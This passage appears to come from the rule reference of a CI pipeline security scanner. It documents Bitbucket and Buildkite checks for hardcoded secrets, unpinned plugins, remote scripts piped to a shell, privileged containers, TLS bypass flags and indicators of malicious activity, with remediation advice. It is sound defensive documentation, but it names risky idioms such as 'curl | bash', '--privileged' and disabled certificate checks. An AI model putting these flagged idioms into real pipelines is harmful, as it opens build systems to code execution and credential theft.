**Source:** [`BB-002`](../providers/bitbucket.md#bb-002) in the [Bitbucket provider](../providers/bitbucket.md).

#### `BB-003`: Variables contain literal secret values <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-bb-003 }

**Evidences:** [`PR.AA-01`](#ctrl-pr-aa-01) Identities and credentials for authorized users, services, and hardware are managed.

**How this is detected.** Scans `definitions.variables` and each step's `variables:` for entries whose KEY looks credential-shaped and whose VALUE is a literal string. AWS access keys are detected by value shape regardless of key name.

**Recommendation.** Store credentials as Repository / Deployment Variables in Bitbucket's Pipelines settings with the 'Secured' flag, and reference them by name. Prefer short-lived OIDC tokens for cloud access.

**Source:** [`BB-003`](../providers/bitbucket.md#bb-003) in the [Bitbucket provider](../providers/bitbucket.md).

#### `BB-005`: Step has no `max-time`, unbounded build <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-bb-005 }

**Evidences:** [`PR.PS-01`](#ctrl-pr-ps-01) Configuration management practices are established and applied.

**How this is detected.** Without `max-time`, the step runs until Bitbucket's 120-minute global default kills it. Explicit per-step timeouts cap blast radius and cost.

**Recommendation.** Add `max-time: <minutes>` to each step, sized to the 95th percentile of historical runtime plus margin. Bounded runs limit the blast radius of a compromised build and prevent runaway minute consumption.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`BB-005`](../providers/bitbucket.md#bb-005) in the [Bitbucket provider](../providers/bitbucket.md).

#### `BB-006`: Artifacts not signed <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bb-006 }

**Evidences:** [`PR.PS-06`](#ctrl-pr-ps-06) Secure software development practices are integrated, and their performance is monitored throughout the SDLC.

**How this is detected.** Unsigned artifacts can't be verified downstream. Passes when cosign / sigstore / slsa-* / notation-sign appears in the pipeline body.

**Recommendation.** Add a step that runs `cosign sign` against the built image or archive, using Bitbucket OIDC for keyless signing where possible. Publish the signature next to the artifact and verify it at deploy time.

**Source:** [`BB-006`](../providers/bitbucket.md#bb-006) in the [Bitbucket provider](../providers/bitbucket.md).

#### `BB-007`: SBOM not produced <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bb-007 }

**Evidences:** [`GV.SC-03`](#ctrl-gv-sc-03) Cybersecurity supply chain risk management is integrated into CS and ERM programs, [`GV.SC-04`](#ctrl-gv-sc-04) Suppliers are known and prioritized by criticality.

**How this is detected.** Without an SBOM, downstream consumers can't audit the dependency set shipped in the artifact. Passes when CycloneDX / syft / anchore / sbom-tool / Trivy-SBOM appears.

**Recommendation.** Add an SBOM step, `syft . -o cyclonedx-json`, Trivy with `--format cyclonedx`, or Microsoft's `sbom-tool`. Attach the SBOM as a build artifact.

**Source:** [`BB-007`](../providers/bitbucket.md#bb-007) in the [Bitbucket provider](../providers/bitbucket.md).

#### `BB-008`: Credential-shaped literal in pipeline body <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-bb-008 }

**Evidences:** [`PR.AA-01`](#ctrl-pr-aa-01) Identities and credentials for authorized users, services, and hardware are managed.

**How this is detected.** Complements BB-003 (variable-name scan). BB-008 checks every string in the pipeline against the cross-provider credential-pattern catalog, catches secrets pasted into script bodies or environment blocks.

**Recommendation.** Rotate the exposed credential. Move the value to a Secured Repository or Deployment Variable and reference it by name.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Test fixtures and documentation blobs sometimes embed credential-shaped strings (JWT samples, AKIAI... examples). The AWS canonical example ``AKIAIOSFODNN7EXAMPLE`` is deliberately NOT suppressed, if it appears in a real pipeline it almost always means a copy-paste from docs was never substituted. Defaults to LOW confidence.

**Source:** [`BB-008`](../providers/bitbucket.md#bb-008) in the [Bitbucket provider](../providers/bitbucket.md).

#### `BB-009`: pipe: pinned by version rather than sha256 digest <span class="pg-sev pg-sev--low">LOW</span> { #detail-bb-009 }

**Evidences:** [`GV.SC-05`](#ctrl-gv-sc-05) Requirements to address cybersecurity risks in supply chains are established, prioritized, and integrated into contracts.

**How this is detected.** BB-001 fails floating tags at HIGH; BB-009 is the stricter tier. Even immutable-looking semver tags can be repointed by the registry; sha256 digests are tamper-evident.

**Recommendation.** Resolve each pipe to its digest (`docker buildx imagetools inspect bitbucketpipelines/<name>:<ver>`) and reference it via `@sha256:<digest>`.

**Source:** [`BB-009`](../providers/bitbucket.md#bb-009) in the [Bitbucket provider](../providers/bitbucket.md).

#### `BB-010`: Deploy step ingests pull-request artifact unverified <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-bb-010 }

**Evidences:** [`PR.IR-01`](#ctrl-pr-ir-01) Networks and environments are protected from unauthorized logical access and usage.

**How this is detected.** Bitbucket steps declare artifacts on the producer and downstream steps implicitly receive them. When an unprivileged step produces an artifact and a later `deployment:` step consumes it without verification, attacker-controlled output flows into the privileged stage.

**Recommendation.** Add a verification step before the deploy step consumes the artifact: `sha256sum -c artifact.sha256` against a manifest the producer signed, or `cosign verify` over the artifact directly. Alternatively, restrict the artifact-producing step to non-PR pipelines via ``branches:`` or ``custom:`` triggers.

**Source:** [`BB-010`](../providers/bitbucket.md#bb-010) in the [Bitbucket provider](../providers/bitbucket.md).

#### `BB-011`: AWS auth uses long-lived access keys <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-bb-011 }

**Evidences:** [`PR.AA-01`](#ctrl-pr-aa-01) Identities and credentials for authorized users, services, and hardware are managed.

**How this is detected.** Long-lived `AWS_ACCESS_KEY_ID` / `AWS_SECRET_ACCESS_KEY` values embedded in the pipeline file can't be rotated on a fine-grained schedule. Prefer OIDC or Bitbucket secured variables for cross-cloud access.

**Recommendation.** Use Bitbucket OIDC with `oidc: true` on the AWS pipe, or store credentials as secured Bitbucket variables rather than inline values. Remove static AWS_ACCESS_KEY_ID / AWS_SECRET_ACCESS_KEY from the pipeline file.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`BB-011`](../providers/bitbucket.md#bb-011) in the [Bitbucket provider](../providers/bitbucket.md).

#### `BB-012`: Remote script piped to shell interpreter <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-bb-012 }

**Evidences:** [`PR.PS-05`](#ctrl-pr-ps-05) Installation and execution of unauthorized software are prevented.

**How this is detected.** Detects `curl | bash`, `wget | sh`, and similar patterns that pipe remote content directly into a shell interpreter inside a pipeline. An attacker who controls the remote endpoint (or poisons DNS / CDN) gains arbitrary code execution in the build runner.

**Recommendation.** Download the script to a file, verify its checksum, then execute it. Or vendor the script into the repository.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Established vendor installers (get.docker.com, sh.rustup.rs, bun.sh/install, awscli.amazonaws.com, cli.github.com, ...) ship via HTTPS from their own CDN and are idiomatic. This rule defaults to LOW confidence so CI gates can ignore them with --min-confidence MEDIUM; the finding still surfaces so teams that want cryptographic verification can audit.

**Source:** [`BB-012`](../providers/bitbucket.md#bb-012) in the [Bitbucket provider](../providers/bitbucket.md).

#### `BB-013`: Docker run with insecure flags (privileged/host mount) <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-bb-013 }

**Evidences:** [`PR.PS-01`](#ctrl-pr-ps-01) Configuration management practices are established and applied.

**How this is detected.** Flags like `--privileged`, `--cap-add`, `--net=host`, or host-root volume mounts (`-v /:/`) in a pipeline give the container full access to the build runner, enabling container escape and lateral movement.

**Recommendation.** Remove --privileged and --cap-add flags. Use minimal volume mounts. Prefer rootless containers.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`BB-013`](../providers/bitbucket.md#bb-013) in the [Bitbucket provider](../providers/bitbucket.md).

#### `BB-014`: Package install from insecure source <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-bb-014 }

**Evidences:** [`GV.SC-04`](#ctrl-gv-sc-04) Suppliers are known and prioritized by criticality.

**How this is detected.** Detects package-manager invocations that use plain HTTP registries (`--index-url http://`, `--registry=http://`) or disable TLS verification (`--trusted-host`, `--no-verify`) in a pipeline. These patterns allow man-in-the-middle injection of malicious packages.

**Recommendation.** Use HTTPS registry URLs. Remove --trusted-host and --no-verify flags. Pin to a private registry with TLS.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`BB-014`](../providers/bitbucket.md#bb-014) in the [Bitbucket provider](../providers/bitbucket.md).

#### `BB-015`: No vulnerability scanning step <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bb-015 }

**Evidences:** [`PR.PS-02`](#ctrl-pr-ps-02) Software is maintained, replaced, and removed commensurate with risk.

**How this is detected.** Without a vulnerability scanning step, known-vulnerable dependencies ship to production undetected. The check recognizes trivy, grype, snyk, npm audit, yarn audit, safety check, pip-audit, osv-scanner, and govulncheck.

**Recommendation.** Add a vulnerability scanning step, trivy, grype, snyk test, npm audit, pip-audit, or osv-scanner. Publish results so vulnerabilities surface before deployment.

**Source:** [`BB-015`](../providers/bitbucket.md#bb-015) in the [Bitbucket provider](../providers/bitbucket.md).

#### `BB-016`: Self-hosted runner without ephemeral marker <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bb-016 }

**Evidences:** [`PR.PS-01`](#ctrl-pr-ps-01) Configuration management practices are established and applied.

**How this is detected.** Self-hosted runners that persist between jobs leak filesystem and process state. A PR-triggered step writes to a well-known path; a subsequent deploy step on the same runner reads it. Detects `runs-on: self.hosted` without an `ephemeral` marker or Docker image override.

**Recommendation.** Use Docker-based self-hosted runners or configure runners to tear down between jobs. Add 'ephemeral' to `runs-on` labels or use Bitbucket's runner images that are rebuilt per-job.

**Source:** [`BB-016`](../providers/bitbucket.md#bb-016) in the [Bitbucket provider](../providers/bitbucket.md).

#### `BB-017`: Repository token written to persistent storage <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-bb-017 }

**Evidences:** [`PR.AA-01`](#ctrl-pr-aa-01) Identities and credentials for authorized users, services, and hardware are managed.

**How this is detected.** Detects patterns where Bitbucket pipeline tokens are redirected to files or piped through `tee`. Persisted tokens survive the step boundary and can be exfiltrated by later steps, artifacts, or cache entries.

**Recommendation.** Never write BITBUCKET_TOKEN or REPOSITORY_OAUTH_ACCESS_TOKEN to files or artifacts. Use the token inline in the command that needs it and let Bitbucket revoke it after the build.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`BB-017`](../providers/bitbucket.md#bb-017) in the [Bitbucket provider](../providers/bitbucket.md).

#### `BB-018`: Cache key derives from attacker-controllable input <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bb-018 }

**Evidences:** [`PR.IR-01`](#ctrl-pr-ir-01) Networks and environments are protected from unauthorized logical access and usage.

**How this is detected.** Bitbucket caches are restored by key. When the key includes a value the attacker controls (branch name, tag, PR ID), a pull-request pipeline can plant a poisoned cache entry that a subsequent default-branch build restores.

**Recommendation.** Build the cache key from values the attacker cannot control. Prefer `hashFiles()` on lockfiles enforced by branch protection. Never include $BITBUCKET_BRANCH or PR-related variables in the cache key.

**Source:** [`BB-018`](../providers/bitbucket.md#bb-018) in the [Bitbucket provider](../providers/bitbucket.md).

#### `BB-019`: after-script references secrets <span class="pg-sev pg-sev--high">HIGH</span> { #detail-bb-019 }

**Evidences:** [`PR.AA-01`](#ctrl-pr-aa-01) Identities and credentials for authorized users, services, and hardware are managed.

**How this is detected.** Bitbucket's `after-script` runs unconditionally after the main `script` block (including on failure). If the `after-script` references secrets or tokens, those values may leak into build logs or artifacts even when the step fails unexpectedly. This check detects secret-like variable references in `after-script` blocks.

**Recommendation.** Move secret-dependent operations into the main `script:` block. `after-script` runs even when the step fails and executes in a separate shell context, credential exposure here is harder to audit and more likely to persist in logs.

**Known false positives.**

- The detector matches any variable whose name contains ``TOKEN`` / ``SECRET`` / ``PASSWORD`` / ``KEY`` (case-insensitive). Names that are descriptive rather than secret (``CACHE_KEY``, ``SORT_KEY``, ``TOKEN_TYPE`` used as a label, ``API_KEY_NAME`` storing the *name* of the key rather than its value) trigger the regex even though they aren't credentials. The rule has no way to tell from the name alone, suppress per-step via ``--ignore-file`` when the referenced value is benign.

**Source:** [`BB-019`](../providers/bitbucket.md#bb-019) in the [Bitbucket provider](../providers/bitbucket.md).

#### `BB-020`: Full clone depth exposes complete history <span class="pg-sev pg-sev--low">LOW</span> { #detail-bb-020 }

**Evidences:** [`PR.PS-01`](#ctrl-pr-ps-01) Configuration management practices are established and applied.

**How this is detected.** By default Bitbucket Pipelines clone with `depth: 50`. Setting `depth: full` exposes the entire commit history, including any secrets that were committed and later removed. This check flags explicit `clone: depth: full` settings.

**Recommendation.** Set `clone: depth: 1` (or a small number) in pipeline or step options to limit the amount of repository history available in the build environment. Full clones make it easier to extract secrets that were committed and later removed.

**Source:** [`BB-020`](../providers/bitbucket.md#bb-020) in the [Bitbucket provider](../providers/bitbucket.md).

#### `BB-021`: Package install without lockfile enforcement <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-bb-021 }

**Evidences:** [`GV.SC-05`](#ctrl-gv-sc-05) Requirements to address cybersecurity risks in supply chains are established, prioritized, and integrated into contracts.

**How this is detected.** Detects package-manager install commands that do not enforce a lockfile or hash verification. Without lockfile enforcement the resolver pulls whatever version is currently latest, exactly the window a supply-chain attacker exploits.

**Recommendation.** Use lockfile-enforcing install commands: `npm ci` instead of `npm install`, `pip install --require-hashes -r requirements.txt`, `yarn install --frozen-lockfile`, `bundle install --frozen`, and `go install tool@v1.2.3`.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`BB-021`](../providers/bitbucket.md#bb-021) in the [Bitbucket provider](../providers/bitbucket.md).

#### `BB-022`: Dependency update command bypasses lockfile pins <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-bb-022 }

**Evidences:** [`GV.SC-07`](#ctrl-gv-sc-07) Risks posed by suppliers, their products and services, are understood, recorded, prioritized, assessed, responded to, and monitored.

**How this is detected.** Detects `pip install --upgrade`, `npm update`, `yarn upgrade`, `bundle update`, `cargo update`, `go get -u`, and `composer update`. These commands bypass lockfile pins and pull whatever version is currently latest. Tooling upgrades (`pip install --upgrade pip`) are exempted.

**Recommendation.** Remove dependency-update commands from CI. Use lockfile-pinned install commands (`npm ci`, `pip install -r requirements.txt`) and update dependencies via a dedicated PR pipeline (e.g. Dependabot, Renovate).

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Common build-tool bootstrapping idioms (``pip install --upgrade pip``, ``pip install --upgrade setuptools wheel virtualenv``) and security-tool installs (``pip install --upgrade pip-audit / cyclonedx-bom / semgrep``) are exempted by the ``DEP_UPDATE_RE`` tooling allowlist. Other tooling-upgrade idioms not yet on the list can still trip the rule. Defaults to MEDIUM confidence so CI gates can require ``--min-confidence HIGH`` to ignore.

**Source:** [`BB-022`](../providers/bitbucket.md#bb-022) in the [Bitbucket provider](../providers/bitbucket.md).

#### `BB-023`: TLS / certificate verification bypass <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-bb-023 }

**Evidences:** [`PR.DS-02`](#ctrl-pr-ds-02) The confidentiality, integrity, and availability of data-in-transit are protected.

**How this is detected.** Detects patterns that disable TLS certificate verification: `git config http.sslVerify false`, `NODE_TLS_REJECT_UNAUTHORIZED=0`, `npm config set strict-ssl false`, `curl -k`, `wget --no-check-certificate`, `PYTHONHTTPSVERIFY=0`, and `GOINSECURE=`. Disabling TLS verification allows MITM injection of malicious packages, repositories, or build tools.

**Recommendation.** Remove TLS verification bypasses. Fix certificate issues at the source (install CA certificates, configure proper trust stores) instead of disabling verification.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`BB-023`](../providers/bitbucket.md#bb-023) in the [Bitbucket provider](../providers/bitbucket.md).

#### `BB-024`: No SLSA provenance attestation produced <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bb-024 }

**Evidences:** [`PR.PS-06`](#ctrl-pr-ps-06) Secure software development practices are integrated, and their performance is monitored throughout the SDLC.

**How this is detected.** Bitbucket has no native SLSA builder; self-hosted attestation via ``cosign attest`` or ``witness run`` is the usual path. Pipes like ``atlassian/cosign-attest`` (if published) would also match.

**Recommendation.** Add a step that runs ``cosign attest`` against a ``provenance.intoto.jsonl`` statement, or integrate the TestifySec ``witness run`` attestor. Artifact signing alone (BB-006) doesn't satisfy SLSA Build L3.

**Source:** [`BB-024`](../providers/bitbucket.md#bb-024) in the [Bitbucket provider](../providers/bitbucket.md).

#### `BB-025`: Pipeline contains indicators of malicious activity <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-bb-025 }

**Evidences:** [`PR.PS-05`](#ctrl-pr-ps-05) Installation and execution of unauthorized software are prevented.

**How this is detected.** Specific indicators only (reverse shells, base64-decoded execution, miner binaries, Discord/Telegram webhooks, credential-dump pipes, audit-erasure commands). Does not replace BB-014 (TLS bypass) or BB-013 (Docker insecure), those are hygiene; this is evidence.

**Recommendation.** Treat as a potential compromise. Identify the PR that added the matching step(s), rotate any credentials referenced from the pipeline's variable groups, and audit recent builds.

**Known false positives.**

- Security-training repositories, CTF challenges, and red-team exercise pipelines legitimately contain reverse-shell strings or exfil domains as literals. Matches inside YAML keys / HCL attributes whose names contain ``example``, ``fixture``, ``sample``, ``demo``, or ``test`` are auto-suppressed; bare lines in a production pipeline still fire.
- Defaults to LOW confidence. Filter with ``--min-confidence MEDIUM`` to ignore all matches; the rule still surfaces the hit for teams that want to spot-check.

**Source:** [`BB-025`](../providers/bitbucket.md#bb-025) in the [Bitbucket provider](../providers/bitbucket.md).

#### `BB-026`: Dangerous shell idiom (eval, sh -c variable, backtick exec) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-bb-026 }

**Evidences:** [`PR.PS-05`](#ctrl-pr-ps-05) Installation and execution of unauthorized software are prevented.

**How this is detected.** Complements BB-002 (script injection from untrusted PR context). This rule fires on intrinsically risky idioms, ``eval``, ``sh -c "$X"``, backtick exec, regardless of whether the input source is currently trusted.

**Recommendation.** Replace ``eval "$VAR"`` / ``sh -c "$VAR"`` / backtick exec with direct command invocation. Validate or allow-list any value that must feed a dynamic command at the boundary.

**Known false positives.**

- ``eval "$(ssh-agent -s)"`` and similar ``eval "$(<literal-tool>)"`` bootstrap idioms are intentionally NOT flagged, the substituted command is literal, only its output is eval'd.

**Source:** [`BB-026`](../providers/bitbucket.md#bb-026) in the [Bitbucket provider](../providers/bitbucket.md).

#### `BB-027`: Package install bypasses registry integrity (git / path / tarball source) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bb-027 }

**Evidences:** [`GV.SC-05`](#ctrl-gv-sc-05) Requirements to address cybersecurity risks in supply chains are established, prioritized, and integrated into contracts.

**How this is detected.** Complements BB-021 (missing lockfile flag). Git URL installs without a commit pin, local-path installs, and direct tarball URLs bypass the registry integrity controls the lockfile relies on.

**Recommendation.** Pin git dependencies to a commit SHA. Publish private packages to an internal registry instead of installing from a filesystem path or tarball URL.

**Source:** [`BB-027`](../providers/bitbucket.md#bb-027) in the [Bitbucket provider](../providers/bitbucket.md).

#### `BK-001`: Buildkite plugin not pinned to an exact version <span class="pg-sev pg-sev--high">HIGH</span> { #detail-bk-001 }

**Evidences:** [`GV.SC-05`](#ctrl-gv-sc-05) Requirements to address cybersecurity risks in supply chains are established, prioritized, and integrated into contracts.

**How this is detected.** Buildkite resolves plugin refs at agent boot. ``foo#v1.2.3`` locks the version; ``foo#main`` / ``foo`` does not. Detection fires on bare names, branch keywords, and partial-semver pins (``v4``, ``v4.13``).

**Recommendation.** Pin every plugin reference to an exact tag (``docker-compose#v4.13.0``) or a 40-char commit SHA. Bare references (``docker-compose``), branch refs (``#main`` / ``#master``), and major-only floats (``#v4``) resolve to whatever is current at agent start time, which lets a compromised plugin release execute inside the pipeline.

**Source:** [`BK-001`](../providers/buildkite.md#bk-001) in the [Buildkite provider](../providers/buildkite.md).

#### `BK-002`: Literal secret value in pipeline env block <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-bk-002 }

**Evidences:** [`PR.AA-01`](#ctrl-pr-aa-01) Identities and credentials for authorized users, services, and hardware are managed, [`PR.DS-01`](#ctrl-pr-ds-01) The confidentiality, integrity, and availability of data-at-rest are protected.

**How this is detected.** Detection fires on values that look like AWS access keys, GitHub PATs, OpenAI keys, JWTs, or generic high-entropy tokens, plus on env-var names that imply a secret (``*_TOKEN``, ``*_KEY``, ``*PASSWORD``, ``*SECRET``) when the value is a non-empty literal rather than an interpolation (``$SECRET_FROM_AGENT_HOOK``).

**Recommendation.** Move the value out of the pipeline file. Use Buildkite's agent secrets hooks (``secrets/`` directory or ``BUILDKITE_PLUGIN_AWS_SSM_*``), the ``aws-ssm`` / ``vault-secrets`` plugins, or the ``BUILDKITE_PIPELINE_DEFAULT_BRANCH`` env var pulled from a secret manager. The pipeline.yml is committed to the repo and visible to anyone with read access.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Names that imply a secret but actually store a non-sensitive identifier flag here: ``CACHE_KEY: build-2024-Q4``, ``API_KEY_PATH: /var/run/secrets/api``, ``SECRET_NAME: my-vault-secret``. The rule has no way to tell from the name + literal alone whether the value is the credential or merely a reference to one. Also: deliberate test fixtures and documentation snippets that embed canonical example values (``AKIAIOSFODNN7EXAMPLE``) match the strong-pattern set; this is intentional, real-world copies of those example literals usually mean a docs paste was never substituted.

**Source:** [`BK-002`](../providers/buildkite.md#bk-002) in the [Buildkite provider](../providers/buildkite.md).

#### `BK-003`: Untrusted Buildkite variable interpolated in command <span class="pg-sev pg-sev--high">HIGH</span> { #detail-bk-003 }

**Evidences:** [`PR.PS-05`](#ctrl-pr-ps-05) Installation and execution of unauthorized software are prevented.

**How this is detected.** Buildkite passes branch / tag / message metadata as environment variables. Putting them inside ``$(...)`` or shelling out with the value unquoted is a classic command-injection vector. The detection fires on the unquoted interpolation form and on use inside ``eval`` / ``$(...)``.

**Recommendation.** Don't interpolate ``$BUILDKITE_BRANCH``, ``$BUILDKITE_TAG``, ``$BUILDKITE_MESSAGE``, ``$BUILDKITE_PULL_REQUEST_*``, or ``$BUILDKITE_BUILD_AUTHOR*`` directly into shell commands. These come from the pull request / branch and are attacker-controllable. Quote them and assign to a local variable first (``branch="$BUILDKITE_BRANCH"; ./script --branch "$branch"``), or pass them as arguments to a script you own.

**Known false positives.**

- The single-token double-quoted form (``"$BUILDKITE_BRANCH"``) is already excluded; multi-token shell snippets that *look* unquoted but are consumed safely by the downstream tool (e.g. a ``./script.sh $BUILDKITE_BRANCH`` where the script treats argv as data and never re-evaluates) still flag. The rule has no AST-level understanding of the called script, suppress per-step via ``--ignore-file`` once you've verified the script handles untrusted argv safely (or quote the use, which is the better fix).

**Source:** [`BK-003`](../providers/buildkite.md#bk-003) in the [Buildkite provider](../providers/buildkite.md).

#### `BK-004`: Remote script piped into shell interpreter <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-bk-004 }

**Evidences:** [`GV.SC-05`](#ctrl-gv-sc-05) Requirements to address cybersecurity risks in supply chains are established, prioritized, and integrated into contracts, [`PR.DS-02`](#ctrl-pr-ds-02) The confidentiality, integrity, and availability of data-in-transit are protected.

**How this is detected.** The detection fires on ``curl|bash``, ``curl|sh``, ``wget|bash``, ``iex (iwr ...)``, and the corresponding ``Invoke-WebRequest|Invoke-Expression`` PowerShell forms. Use ``curl -fsSLO <url>; sha256sum -c install.sh.sha256; bash install.sh`` instead.

**Recommendation.** Download the installer to disk, verify a checksum or signature, then execute it. ``curl ... | sh`` lets the remote host change what runs in your pipeline at any time, and any TLS / DNS error during download silently feeds a partial script to the shell.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`BK-004`](../providers/buildkite.md#bk-004) in the [Buildkite provider](../providers/buildkite.md).

#### `BK-005`: Container started with --privileged or host-bind escalation <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-bk-005 }

**Evidences:** [`PR.PS-01`](#ctrl-pr-ps-01) Configuration management practices are established and applied.

**How this is detected.** Detection fires on ``--privileged``, ``--cap-add=SYS_ADMIN``, ``--pid=host`` / ``--ipc=host`` / ``--userns=host``, and explicit mounts of the host Docker socket (``/var/run/docker.sock``).

**Recommendation.** Drop ``--privileged``, ``--cap-add=SYS_ADMIN``, ``--pid=host``, and ``-v /var/run/docker.sock`` from container invocations. If the workload needs Docker-in-Docker, use a build-specific rootless option (``buildx``, ``kaniko``, ``buildah --isolation=chroot``) instead of opening the host kernel and the agent's Docker socket to the build script.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`BK-005`](../providers/buildkite.md#bk-005) in the [Buildkite provider](../providers/buildkite.md).

#### `BK-006`: Step has no timeout_in_minutes <span class="pg-sev pg-sev--low">LOW</span> { #detail-bk-006 }

**Evidences:** [`PR.PS-01`](#ctrl-pr-ps-01) Configuration management practices are established and applied.

**How this is detected.** Buildkite has no implicit timeout; agents will wait forever. Set ``timeout_in_minutes:`` per step. The pipeline-level default counts, a global ``steps:`` block with ``timeout_in_minutes:`` is fine, since Buildkite copies it to each step.

**Recommendation.** Set ``timeout_in_minutes:`` on every command step. A compromised dependency or a hung test can otherwise hold an agent indefinitely, blocking parallel pipelines and running up self-hosted-runner cost. Pick a value generous enough for the slowest legitimate run (e.g. 30 for a typical build, 90 for an integration suite).

**Known false positives.**

- Steps that genuinely need >24h (rare; database migrations, ML training jobs), set ``timeout_in_minutes: 1440`` explicitly so the absence of a timeout is intentional.

**Source:** [`BK-006`](../providers/buildkite.md#bk-006) in the [Buildkite provider](../providers/buildkite.md).

#### `BK-007`: Deploy step not gated by a manual block / input <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bk-007 }

**Evidences:** [`PR.AA-05`](#ctrl-pr-aa-05) Access permissions, entitlements, and authorizations are defined in a policy, managed, enforced, and reviewed, [`PR.PS-06`](#ctrl-pr-ps-06) Secure software development practices are integrated, and their performance is monitored throughout the SDLC.

**How this is detected.** A step is treated as a deploy when its label, key, or any command line contains a deploy keyword (``deploy``, ``ship``, ``release``, ``promote``, ``apply``, ``rollout``, ``terraform apply``, ``kubectl apply``, ``helm upgrade``, ``aws ecs update-service``). The check passes when at least one preceding step in the same pipeline file is a ``block:`` or ``input:`` flow-control step.

**Recommendation.** Insert a ``- block: "Deploy?"`` (or ``- input:`` step) in front of every deploy step. Buildkite waits for a human to click *Unblock* before the gated steps run, which prevents an unreviewed merge from auto-deploying to production. Combine with ``branches: main`` so the gate only appears on release branches.

**Known false positives.**

- Pipelines where the deploy gate lives in a triggered pipeline rather than the local file, the local pipeline looks ungated even though the actual deploy is gated downstream. Add a no-op ``block:`` to silence.

**Source:** [`BK-007`](../providers/buildkite.md#bk-007) in the [Buildkite provider](../providers/buildkite.md).

#### `BK-008`: TLS verification disabled in step command <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-bk-008 }

**Evidences:** [`PR.DS-02`](#ctrl-pr-ds-02) The confidentiality, integrity, and availability of data-in-transit are protected.

**How this is detected.** Detection fires on the canonical bypass flags across curl, wget, git, npm, pip, gcloud, and openssl. The check is deliberately conservative, partial-word matches (``--insecure-protocols``) are excluded.

**Recommendation.** Drop ``curl -k`` / ``--insecure``, ``wget --no-check-certificate``, ``git -c http.sslVerify=false``, and ``pip install --trusted-host``. If a CA isn't trusted, install it into the agent's trust store (``update-ca-certificates``) rather than disabling validation pipeline-wide. A compromised intermediate that strips TLS gets a free hand with every fetch the step performs.

